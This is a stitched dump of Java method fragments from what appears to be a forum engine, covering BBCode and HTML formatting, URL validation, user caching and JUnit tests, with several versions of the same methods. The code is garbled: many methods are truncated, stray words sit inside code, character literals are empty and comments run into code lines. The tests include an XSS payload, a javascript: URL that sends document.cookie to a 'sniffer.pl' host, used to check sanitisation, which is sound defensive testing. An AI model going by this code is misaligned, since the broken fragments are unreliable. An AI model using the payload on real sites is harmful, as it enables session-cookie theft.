public String getContentImpl ( ProfileHashtable profile ) throws Exception { return " <h2> IBM developerWorks</h2> " + " <iframe src= \" dw.jsp?height=400&amp;width=235&amp;main=1 \" width= \" 238 \" height= \" 400 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe> " + 
public int saveNewMessage ( Connection db , String remoteAddr , String userAgent ) throws SQLException { Group . checkCommentsAllowed ( db , topic , userid ) ; PreparedStatement pstMsgbase = null ; PreparedStatement pst = null ; try { allocation MSGID 
public static List < Group > getGroups ( Connection db , Section section ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, lineonly, imagepost, vote, section, havelink, linkup, linktext, sections.name as sname, title, image, restrict_topics, restrict_comments, sections.browsable,stat1,stat2,stat3,groups.id,groups.info FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; List < Group > list = new ArrayList < Group > ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; list . add ( group ) ; } return list ; } 
private void init ( ResultSet rs ) throws SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; preformat = rs . getBoolean ( " preformat " ) ; lineonly = rs . getBoolean ( " lineonly " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linkup = rs . getBoolean ( " linkup " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; title = rs . getString ( " title " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; restrictComments = rs . getInt ( " restrict_comments " ) ; browsable = rs . getBoolean ( " browsable " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; info = rs . getString ( " info " ) ; } 
public boolean isCommentsRestricted ( ) { return restrictComments ! = 0 ; } 
public static void checkCommentsAllowed ( Connection db , int topicid , int userid ) throws SQLException { Statement st = null ; try { User user = User . getUserCached ( db , userid ) ; 
private void formatModeFixup ( ) { formatMode = getFormatMode ( getProf ( ) . getString ( " format.mode " ) ) ; userProfile . getHashtable ( ) . setString ( " format.mode " , formatMode ) ; } 
public String process ( ) throws UtilException { if ( htmlInput ) { checkHTML ( ) ; } StringTokenizer st ; if ( plainTextInput ) { st = new StringTokenizer ( htmlSpecialChars ( text ) , delim , true ) ; } else { st = new StringTokenizer ( text , delim , true ) ; } StringBuffer sb = new StringBuffer ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . toString ( ) ; if ( NewLine ) { res = nl2br ( res , quoting ) ; } if ( texNewLine ) { res = texnl2br ( res , quoting ) ; } if ( Preformat ) { res = " <pre> " + res + " </pre> " ; } return res ; } 
private String formatHTMLLine ( String chunk ) { StringBuffer out = new StringBuffer ( ) ; REMatchEnumeration en = urlRE . getMatchEnumeration ( chunk ) ; int index = 0 ; while ( en . hasMoreElements ( ) ) { REMatch found = en . nextMatch ( ) ; URL out.append(wrapLongLine(chunk.substring(index, found.getStartIndex()), maxlength, nl, index)); URL String url = chunk.substring(found.getStartIndex(), found.getEndIndex()); if (urlHighlight) { String urlchunk = url; if (url.toLowerCase().startsWith("www.")) { url = "http:" + url; } else if (url.toLowerCase().startsWith("ftp.")) { url = "ftp:" + url; } if (Preformat) { urlchunk = wrapLongLine(urlchunk, maxlength, nl, found.getStartIndex()); } else if (urlchunk.length() > maxlength) { urlchunk = urlchunk.substring(0, maxlength - 3) + "..."; } out.append("<a href=\"").append(URLEncoder(url)).append("\">").append(urlchunk).append("</a>"); } else { out.append(url); } index = found.getEndIndex(); } if (index < chunk.length()) { out.append(wrapLongLine(chunk.substring(index), maxlength, nl, index)); } return out.toString(); } 
public static String nl2br ( String text ) { return nl2br ( text , false ) ; } 
public static String nl2br ( String text , boolean quoting ) { if ( ! quoting ) { return nlRE . substituteAll ( text , " <br> " ) ; } StringBuffer buf = new StringBuffer ( ) ; boolean cr = false ; boolean quot = false ; boolean skip = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( i ! = 0 ) { buf . append ( " <p> " ) ; skip = true ; } if ( text . substring ( i ) . trim ( ) . startsWith ( " &gt; " ) ) { quot = true ; buf . append ( " <i> " ) ; } } else { cr = true ; } if ( text . charAt ( i ) = = '' ) { if ( skip ) { skip = false ; } else { buf . append ( " <br> " ) ; } } } else { cr = false ; } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . toString ( ) ; } 
public static String wrapLongLine ( String line , int maxlength , String delim ) { return wrapLongLine ( line , maxlength , delim , 0 ) ; } 
public boolean isCommentPostingAllowed ( User currentUser ) { if ( ! isCommentsRestricted ( ) ) { return true ; } if ( currentUser = = null ) { return false ; } if ( currentUser . isBlocked ( ) ) { return false ; } return currentUser . getScore ( ) > = restrictComments ; } 
public boolean isTopicPostingAllowed ( User currentUser ) { if ( ! isTopicsRestricted ( ) ) { return true ; } if ( currentUser = = null ) { return false ; } if ( currentUser . isBlocked ( ) ) { return false ; } return currentUser . getScore ( ) > = restrictTopics ; } 
public void testQuiting1 ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( QUOTING1 ) ; formatter . enablePlainTextMode ( ) ; formatter . enableTexNewLineMode ( ) ; formatter . enableQuoting ( ) ; assertEquals ( RESULT_QUOTING1 , formatter . process ( ) ) ; } 
public void testQuiting2 ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( QUOTING2 ) ; formatter . enablePlainTextMode ( ) ; formatter . enableTexNewLineMode ( ) ; formatter . enableQuoting ( ) ; assertEquals ( RESULT_QUOTING2 , formatter . process ( ) ) ; } 
public void testQuiting3 ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( QUOTING3 ) ; formatter . enablePlainTextMode ( ) ; formatter . enableTexNewLineMode ( ) ; formatter . enableQuoting ( ) ; assertEquals ( RESULT_QUOTING3 , formatter . process ( ) ) ; } 
public static String nl2br ( String text , boolean quoting ) { if ( ! quoting ) { return nlRE . substituteAll ( text , " <br> " ) ; } StringBuffer buf = new StringBuffer ( ) ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( text . substring ( i ) . trim ( ) . startsWith ( " &gt; " ) ) { quot = true ; buf . append ( " <i> " ) ; } if ( text . charAt ( i ) = = '' ) { buf . append ( " <br> " ) ; } } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . toString ( ) ; } 
public boolean isBlockable ( ) { if ( id = = 2 ) { return false ; } if ( canModerate ( ) ) { return false ; } return maxScore < BLOCK_SCORE ; } 
public void addUser ( Connection db , User user ) throws SQLException , AccessViolationException { int id = user . getId ( ) ; if ( user . canModerate ( ) ) { throw new AccessViolationException ( " " ) ; 
public boolean removeNick ( Connection db , int uid ) throws SQLException { if ( ! ignoreList . containsKey ( uid ) ) { return false ; } PreparedStatement pst = db . prepareStatement ( " DELETE FROM ignore_list WHERE userid=? AND ignored=? " ) ; pst . clearParameters ( ) ; pst . setInt ( 1 , userId ) ; pst . setInt ( 2 , uid ) ; boolean r = pst . executeUpdate ( ) = = 1 ; if ( r ) { ignoreList . remove ( uid ) ; } return r ; } 
public static User getUser ( Connection con , String name ) throws SQLException , UserNotFoundException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; User user = new User ( con , name ) ; String shortCacheId = " User?id= " + user . getId ( ) ; String cacheId = MemCachedSettings . getId ( shortCacheId ) ; mcc . set ( cacheId , user , new Date ( new Date ( ) . getTime ( ) + CACHE_MILLIS ) ) ; return user ; } 
private static User getUser ( Connection db , int id , boolean useCache ) throws SQLException , UserNotFoundException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String shortCacheId = " User?id= " + id ; String cacheId = MemCachedSettings . getId ( shortCacheId ) ; User res = null ; if ( useCache ) { res = ( User ) mcc . get ( cacheId ) ; } if ( res = = null ) { res = new User ( db , id ) ; mcc . set ( cacheId , res , new Date ( new Date ( ) . getTime ( ) + CACHE_MILLIS ) ) ; } return res ; } 
private void updateCache ( Connection db ) throws SQLException { try { User . getUser ( db , id ) ; 
public void changeScore ( Connection db , int delta ) throws SQLException { PreparedStatement st = null ; try { st = db . prepareStatement ( " UPDATE users SET score=score+? WHERE id=? " ) ; 
public boolean containsUser ( User user ) { return ignoreList . containsKey ( user . getId ( ) ) ; } 
public int saveNewMessage ( Connection db , String remoteAddr ) throws SQLException , AccessViolationException , UserNotFoundException , MessageNotFoundException { return saveNewMessage ( db , remoteAddr , " " ) ; } 
public int saveNewMessage ( Connection db , String remoteAddr , String userAgent ) throws SQLException , AccessViolationException , UserNotFoundException , MessageNotFoundException { Group . checkCommentsAllowed ( db , topic , userid ) ; PreparedStatement pstMsgbase = null ; PreparedStatement pst = null ; try { allocation MSGID 
public static void checkCommentsAllowed ( Connection db , int topicid , int userid ) throws SQLException , AccessViolationException , MessageNotFoundException , UserNotFoundException { Statement st = null ; try { User user = User . getUserCached ( db , userid ) ; 
public static List < Group > getGroups ( Connection db , Section section ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, lineonly, imagepost, vote, section, havelink, linktext, sections.name as sname, title, image, restrict_topics, restrict_comments, sections.browsable,stat1,stat2,stat3,groups.id,groups.info FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; List < Group > list = new ArrayList < Group > ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; list . add ( group ) ; } return list ; } 
private void init ( ResultSet rs ) throws SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; preformat = rs . getBoolean ( " preformat " ) ; lineonly = rs . getBoolean ( " lineonly " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; title = rs . getString ( " title " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; restrictComments = rs . getInt ( " restrict_comments " ) ; browsable = rs . getBoolean ( " browsable " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; info = rs . getString ( " info " ) ; } 
public Timestamp getLastCommitdate ( Connection db ) throws SQLException { Statement st = null ; ResultSet rs = null ; try { st = db . createStatement ( ) ; 
public boolean isAcceptBBCode ( ) { return acceptBBCode ; } 
public boolean isAcceptHTML ( ) { return acceptHTML ; } 
public String preparePostText ( String texto ) { if ( ! isAcceptHTML ( ) ) { texto = HTMLFormatter . htmlSpecialChars ( texto ) ; } if ( isAcceptBBCode ( ) ) { texto = process ( texto ) ; } return texto ; } 
private String process ( String string ) { StringBuffer buffer = new StringBuffer ( string ) ; new CodeTag ( ) . processContent ( buffer ) ; processNestedTags ( buffer , " quote " , " <div class= \" quote \" ><h3>{BBCODE_PARAM}</h3> " , " </div> " , " <div class= \" quote \" ><h3></h3> " , " </div> " , " [*] " , false , true , true ) ; processNestedTags ( buffer , " list " , " <ol type= \" {BBCODE_PARAM} \" > " , " </ol> " , " <ul> " , " </ul> " , " <li> " , true , true , true ) ; StringBuffer sb1 = buffer ; StringBuffer sb2 = new StringBuffer ( ( int ) ( buffer . length ( ) * 1.5 ) ) ; for ( RegexTag tag : REGEX_TAGS ) { substitute ( sb1 , sb2 , tag . getRegex ( ) , tag . getReplacement ( ) ) ; StringBuffer temp = sb1 ; sb1 = sb2 ; sb2 = temp ; } return sb1 . toString ( ) ; } 
private void substitute ( CharSequence from , StringBuffer to , String regex , String replacement ) { to . setLength ( 0 ) ; Pattern p = Pattern . compile ( regex ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { m . appendReplacement ( to , replacement ) ; } m . appendTail ( to ) ; } 
public int compare ( MutableCharSequence o1 , MutableCharSequence o2 ) { MutableCharSequence s1 = o1 ; MutableCharSequence s2 = o2 ; return - ( s1 . start - s2 . start ) ; } 
public char charAt ( int index ) { return base . charAt ( start + index ) ; } 
public CharSequence subSequence ( int pStart , int end ) { return new MutableCharSequence ( base , start + pStart , 
public void reset ( CharSequence pBase , int pStart , int pLength ) { base = pBase ; start = pStart ; length = pLength ; } 
public String toString ( ) { StringBuffer sb = new StringBuffer ( ) ; for ( int i = start ; i < ( start + length ) ; i + + ) { sb . append ( base . charAt ( i ) ) ; } return sb . toString ( ) ; } 
public void testLineBreak ( ) { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( LINE_BREAK_TEST ) ; assertEquals ( LINE_BREAK_RESULT , result ) ; } 
public void testTagExcape ( ) { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( TAG_ESCAPE_TEST ) ; assertEquals ( TAG_ESCAPE_RESULT , result ) ; } 
public void processContent ( StringBuffer buffer ) { int start = buffer . indexOf ( " [code] " ) ; int end ; for ( ; ( start < buffer . length ( ) ) & & ( start ! = - 1 ) ; start = buffer . indexOf ( " [code] " , end ) ) { end = buffer . indexOf ( " [/code] " , start ) ; 
private static String escapeHtmlBBcode ( String content ) { ".toCharArray(), new String[]{"&amp;", "&quot;", "&#58;", "&#91;", "&#93;", "&lt;", "&gt;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;"}); taking off start and end line breaks content = content.replaceAll("\\A\r|\\A\r|\\A|\r\\z|\r\\z|\\z", ""); replacing line breaks for <br> content = content.replaceAll("\r", "<br>"); content = replaceAll(content, "\r".toCharArray(), new String[]{"<br>", "<br>"}); replacing spaces for &nbsp; to keep indentation content = content.replaceAll(" ", "&nbsp; "); content = content.replaceAll(" ", " &nbsp;"); return content; } 
private static String replaceAll ( CharSequence str , char [ ] chars , String [ ] replacement ) { StringBuffer buffer = new StringBuffer ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { char c = str . charAt ( i ) ; boolean matched = false ; for ( int j = 0 ; j < chars . length ; j + + ) { if ( c = = chars [ j ] ) { buffer . append ( replacement [ j ] ) ; matched = true ; } } if ( ! matched ) { buffer . append ( c ) ; } } return buffer . toString ( ) ; } 
String getTagName ( ) ; void processContent ( StringBuffer buffer , String tagName , String openSubstWithParam , String closeSubstWithParam , String openSubstWithoutParam , String closeSubstWithoutParam , String internalSubst , boolean processInternalTags , boolean acceptParam , boolean requiresQuotedParam ) ; } 
void processContent ( StringBuffer buffer , String tagName , String openSubstWithParam , String closeSubstWithParam , String openSubstWithoutParam , String closeSubstWithoutParam , String internalSubst , boolean processInternalTags , boolean acceptParam , boolean requiresQuotedParam ) ; } 
String getTagName ( ) ; String getReplacement ( ) ; } 
String getRegex ( ) ; String getReplacement ( ) ; } 
public String preparePostText ( String texto ) throws BadURLException { if ( ! isAcceptHTML ( ) ) { texto = HTMLFormatter . htmlSpecialChars ( texto ) ; } if ( isAcceptBBCode ( ) ) { texto = process ( texto ) ; } return texto ; } 
private String process ( String string ) throws BadURLException { StringBuffer buffer = new StringBuffer ( string ) ; new CodeTag ( ) . processContent ( buffer ) ; processNestedTags ( buffer , " quote " , " <div class= \" quote \" ><h3>{BBCODE_PARAM}</h3> " , " </div> " , " <div class= \" quote \" ><h3></h3> " , " </div> " , " [*] " , false , true , true ) ; processNestedTags ( buffer , " list " , " <ol type= \" {BBCODE_PARAM} \" > " , " </ol> " , " <ul> " , " </ul> " , " <li> " , true , true , true ) ; StringBuffer sb1 = buffer ; StringBuffer sb2 = new StringBuffer ( ( int ) ( buffer . length ( ) * 1.5 ) ) ; for ( RegexTag tag : REGEX_TAGS ) { substitute ( sb1 , sb2 , tag , tag . getReplacement ( ) ) ; StringBuffer temp = sb1 ; sb1 = sb2 ; sb2 = temp ; } return sb1 . toString ( ) ; } 
private void substitute ( CharSequence from , StringBuffer to , RegexTag regex , String replacement ) throws BadURLException { to . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { String value = m . group ( 1 ) ; if ( regex . isUrl ( ) ) { if ( ! URLUtil . isUrl ( value ) ) { throw new BadURLException ( value ) ; } } m . appendReplacement ( to , replacement ) ; } m . appendTail ( to ) ; } 
public int compare ( MutableCharSequence o1 , MutableCharSequence o2 ) { return - ( o1 . start - o2 . start ) ; } 
public void testLineBreak ( ) throws BadURLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( LINE_BREAK_TEST ) ; assertEquals ( LINE_BREAK_RESULT , result ) ; } 
public void testTagExcape ( ) throws BadURLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( TAG_ESCAPE_TEST ) ; assertEquals ( TAG_ESCAPE_RESULT , result ) ; } 
public void testJavascriptURL ( ) throws BadURLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . preparePostText ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " ) ; } 
String getTagName ( ) ; String getReplacement ( ) ; boolean isUrl ( ) ; } 
Pattern getRegex ( ) ; String getReplacement ( ) ; boolean isUrl ( ) ; } 
public static String fixURL ( String url ) throws UtilException { url = url . trim ( ) ; if ( isUrl ( url ) ) { if ( url . toLowerCase ( ) . startsWith ( " www. " ) ) { return " http: " + url ; } if ( url . toLowerCase ( ) . startsWith ( " ftp. " ) ) { return " ftp: " + url ; } return url ; } throw new BadURLException ( url ) ; } 
public static boolean isUrl ( String x ) { return isUrl . isMatch ( x ) ; } 
public void testJavascriptURL ( ) throws BadURLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . preparePostText ( JAVASCRIPT_URL ) ; } 
public void testCodeExcape ( ) throws BadURLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( " [code] \" code&code \" [/code] " ) ; assertEquals ( " <div class= \" code \" >&quot;code&amp;code&quot;</div> " , result ) ; } 
private static String escapeHtmlBBcode ( String content ) { ".toCharArray(), new String[]{ "&#58;", "&#91;", "&#93;", "&lt;", "&gt;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;"}); taking off start and end line breaks content = content.replaceAll("\\A\r|\\A\r|\\A|\r\\z|\r\\z|\\z", ""); replacing line breaks for <br> content = content.replaceAll("\r", "<br>"); content = replaceAll(content, "\r".toCharArray(), new String[]{"<br>", "<br>"}); replacing spaces for &nbsp; to keep indentation content = content.replaceAll(" ", "&nbsp; "); content = content.replaceAll(" ", " &nbsp;"); return content; } 
private static String replaceAll ( CharSequence str , char [ ] chars , String [ ] replacement ) { StringBuilder buffer = new StringBuilder ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { char c = str . charAt ( i ) ; boolean matched = false ; for ( int j = 0 ; j < chars . length ; j + + ) { if ( c = = chars [ j ] ) { buffer . append ( replacement [ j ] ) ; matched = true ; } } if ( ! matched ) { buffer . append ( c ) ; } } return buffer . toString ( ) ; } 
private String process ( String string ) { StringBuffer buffer = new StringBuffer ( string ) ; new CodeTag ( ) . processContent ( buffer ) ; processNestedTags ( buffer , " quote " , " <div class= \" quote \" ><h3>{BBCODE_PARAM}</h3> " , " </div> " , " <div class= \" quote \" ><h3></h3> " , " </div> " , " [*] " , false , true , true ) ; processNestedTags ( buffer , " list " , " <ol type= \" {BBCODE_PARAM} \" > " , " </ol> " , " <ul> " , " </ul> " , " <li> " , true , true , true ) ; StringBuffer sb1 = buffer ; StringBuffer sb2 = new StringBuffer ( ( int ) ( buffer . length ( ) * 1.5 ) ) ; for ( RegexTag tag : REGEX_TAGS ) { tag . substitute ( sb1 , sb2 , tag , tag . getReplacement ( ) ) ; StringBuffer temp = sb1 ; sb1 = sb2 ; sb2 = temp ; } return sb1 . toString ( ) ; } 
public void testJavascriptURL ( ) throws BadURLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( JAVASCRIPT_URL ) ; assertEquals ( " <s>javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s> " , result ) ; } 
String getTagName ( ) ; String getReplacement ( ) ; void substitute ( CharSequence from , StringBuffer to , RegexTag regex , String replacement ) ; } 
Pattern getRegex ( ) ; String getReplacement ( ) ; void substitute ( CharSequence from , StringBuffer to , RegexTag regex , String replacement ) ; } 
String getReplacement ( ) ; void substitute ( CharSequence from , StringBuffer to , RegexTag regex , String replacement ) ; } 
void substitute ( CharSequence from , StringBuffer to , RegexTag regex , String replacement ) ; } 
public void substitute ( CharSequence from , StringBuffer to , RegexTag regex , String replacement ) { to . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { m . appendReplacement ( to , replacement ) ; } m . appendTail ( to ) ; } 
public void substitute ( CharSequence from , StringBuffer to , RegexTag regex , String replacement ) { to . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { String value = m . group ( 1 ) ; if ( ! URLUtil . isUrl ( value ) ) { m . appendReplacement ( to , BAD_DATA ) ; } else { m . appendReplacement ( to , replacement ) ; } } m . appendTail ( to ) ; } 
public void substitute ( CharSequence from , StringBuffer to , RegexTag regex , String replacement ) { to . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { String value = m . group ( 1 ) ; if ( ! StringUtil . checkLoginName ( value ) ) { m . appendReplacement ( to , BAD_DATA ) ; } else { m . appendReplacement ( to , replacement ) ; } } m . appendTail ( to ) ; } 
public String preparePostText ( Connection db , String texto ) throws SQLException { if ( ! isAcceptHTML ( ) ) { texto = HTMLFormatter . htmlSpecialChars ( texto ) ; } if ( isAcceptBBCode ( ) ) { texto = process ( db , texto ) ; } return texto ; } 
private String process ( Connection db , String string ) throws SQLException { StringBuffer buffer = new StringBuffer ( string ) ; new CodeTag ( ) . processContent ( buffer ) ; processNestedTags ( buffer , " quote " , " <div class= \" quote \" ><h3>{BBCODE_PARAM}</h3> " , " </div> " , " <div class= \" quote \" ><h3></h3> " , " </div> " , " [*] " , false , true , true ) ; processNestedTags ( buffer , " list " , " <ol type= \" {BBCODE_PARAM} \" > " , " </ol> " , " <ul> " , " </ul> " , " <li> " , true , true , true ) ; StringBuffer sb1 = buffer ; StringBuffer sb2 = new StringBuffer ( ( int ) ( buffer . length ( ) * 1.5 ) ) ; for ( RegexTag tag : REGEX_TAGS ) { tag . substitute ( db , sb1 , sb2 , tag , tag . getReplacement ( ) ) ; StringBuffer temp = sb1 ; sb1 = sb2 ; sb2 = temp ; } return sb1 . toString ( ) ; } 
public void testLineBreak ( ) throws BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , LINE_BREAK_TEST ) ; assertEquals ( LINE_BREAK_RESULT , result ) ; } 
public void testTagExcape ( ) throws BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , TAG_ESCAPE_TEST ) ; assertEquals ( TAG_ESCAPE_RESULT , result ) ; } 
public void testJavascriptURL ( ) throws BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , JAVASCRIPT_URL ) ; assertEquals ( " <s>javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s> " , result ) ; } 
public void testCodeExcape ( ) throws BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , " [code] \" code&code \" [/code] " ) ; assertEquals ( " <div class= \" code \" >&quot;code&amp;code&quot;</div> " , result ) ; } 
String getTagName ( ) ; String getReplacement ( ) ; void substitute ( Connection db , CharSequence from , StringBuffer to , RegexTag regex , String replacement ) throws SQLException ; } 
Pattern getRegex ( ) ; String getReplacement ( ) ; void substitute ( Connection db , CharSequence from , StringBuffer to , RegexTag regex , String replacement ) throws SQLException ; } 
String getReplacement ( ) ; void substitute ( Connection db , CharSequence from , StringBuffer to , RegexTag regex , String replacement ) throws SQLException ; } 
void substitute ( Connection db , CharSequence from , StringBuffer to , RegexTag regex , String replacement ) throws SQLException ; } 
public void substitute ( Connection db , CharSequence from , StringBuffer to , RegexTag regex , String replacement ) throws SQLException { to . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { m . appendReplacement ( to , replacement ) ; } m . appendTail ( to ) ; } 
public void substitute ( Connection db , CharSequence from , StringBuffer to , RegexTag regex , String replacement ) { to . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { String value = m . group ( 1 ) ; if ( ! URLUtil . isUrl ( value ) ) { m . appendReplacement ( to , BAD_DATA ) ; } else { m . appendReplacement ( to , replacement ) ; } } m . appendTail ( to ) ; } 
public void substitute ( Connection db , CharSequence from , StringBuffer to , RegexTag regex , String replacement ) throws SQLException { to . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { String value = m . group ( 1 ) ; if ( ! StringUtil . checkLoginName ( value ) ) { m . appendReplacement ( to , BAD_DATA ) ; } else { try { User user = User . getUser ( db , value ) ; if ( ! user . isBlocked ( ) ) { m . appendReplacement ( to , replacement ) ; } else { m . appendReplacement ( to , BLOCKED_VIEW ) ; } } catch ( UserNotFoundException ex ) { m . appendReplacement ( to , BAD_DATA ) ; } } } m . appendTail ( to ) ; } 
public String process ( ) { StringTokenizer st = new StringTokenizer ( htmlSpecialChars ( text ) , delim , true ) ; StringBuffer sb = new StringBuffer ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . toString ( ) ; if ( NewLine ) { res = nl2br ( res , quoting ) ; } if ( texNewLine ) { res = texnl2br ( res , quoting ) ; } if ( Preformat ) { res = " <pre> " + res + " </pre> " ; } return res ; } 
private static String URLEncoder ( String str ) { try { StringBuffer buf = new StringBuffer ( ) ; 
private static String nl2br ( String text , boolean quoting ) { if ( ! quoting ) { return nlRE . substituteAll ( text , " <br> " ) ; } StringBuffer buf = new StringBuffer ( ) ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( text . substring ( i ) . trim ( ) . startsWith ( " &gt; " ) ) { quot = true ; buf . append ( " <i> " ) ; } if ( text . charAt ( i ) = = '' ) { buf . append ( " <br> " ) ; } } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . toString ( ) ; } 
private static String texnl2br ( String text , boolean quoting ) { if ( ! quoting ) { return texnlRE . substituteAll ( text , " <p> " ) ; } StringBuffer buf = new StringBuffer ( ) ; boolean cr = false ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( i ! = 0 ) { buf . append ( " <p> " ) ; } if ( text . substring ( i ) . trim ( ) . startsWith ( " &gt; " ) ) { quot = true ; buf . append ( " <i> " ) ; } } else { cr = true ; } } else { cr = false ; } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . toString ( ) ; } 
private static String wrapLongLine ( String line , int maxlength , String delim , int start ) { StringBuffer sb = new StringBuffer ( ) ; int index = start ; for ( Iterator i = new SGMLStringIterator ( line ) ; i . hasNext ( ) ; ) { String ch = ( String ) i . next ( ) ; if ( index % maxlength = = maxlength - 1 ) { sb . append ( delim ) ; } sb . append ( ch ) ; index + + ; } return sb . toString ( ) ; } 
public void testQuiting1 ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( QUOTING1 ) ; formatter . enableTexNewLineMode ( ) ; formatter . enableQuoting ( ) ; assertEquals ( RESULT_QUOTING1 , formatter . process ( ) ) ; } 
public void testQuiting2 ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( QUOTING2 ) ; formatter . enableTexNewLineMode ( ) ; formatter . enableQuoting ( ) ; assertEquals ( RESULT_QUOTING2 , formatter . process ( ) ) ; } 
public void testQuiting3 ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( QUOTING3 ) ; formatter . enableTexNewLineMode ( ) ; formatter . enableQuoting ( ) ; assertEquals ( RESULT_QUOTING3 , formatter . process ( ) ) ; } 
protected ModelAndView handleRequestInternal ( HttpServletRequest httpServletRequest , HttpServletResponse httpServletResponse ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; return new ModelAndView ( " add " , params ) ; } 
